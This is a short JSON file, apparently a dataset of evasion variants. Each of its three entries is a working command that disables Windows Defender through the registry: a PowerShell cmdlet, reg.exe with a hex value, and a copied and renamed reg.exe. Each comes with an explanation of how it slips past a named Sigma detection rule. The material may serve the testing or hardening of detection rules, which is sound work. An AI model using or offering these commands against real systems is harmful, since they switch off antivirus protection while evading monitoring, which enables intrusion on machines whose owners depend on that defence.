@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1\"",
+    "explanation": "The Sigma rule specifically targets the execution of 'reg.exe' (via Image or OriginalFileName). By using PowerShell's 'Set-ItemProperty' cmdlet to modify the registry key instead, the 'selection_root_img' condition is never met, bypassing the detection entirely while achieving the same result."
+  },
+  {
+    "output": "reg  add  \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d 0x1 /f",
+    "explanation": "The rule looks for the literal string 'd 1' to identify the dword value being set to 1. By using the hexadecimal representation '0x1', the 'selection_dword_1' condition (which requires 'd 1') is bypassed because '0x1' does not match the expected string 'd 1'."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\reg.exe C:\\Users\\Public\\not_reg.exe && C:\\Users\\Public\\not_reg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiVirus /t REG_DWORD /d 1 /f",
+    "explanation": "While the rule attempts to catch renamed binaries using 'OriginalFileName', some environments only log the process path ('Image'). Renaming the binary to 'not_reg.exe' can bypass logic that relies solely on 'Image|endswith' if the 'OriginalFileName' field is not being properly captured or indexed in the SIEM's specific log source."
+  }
+]
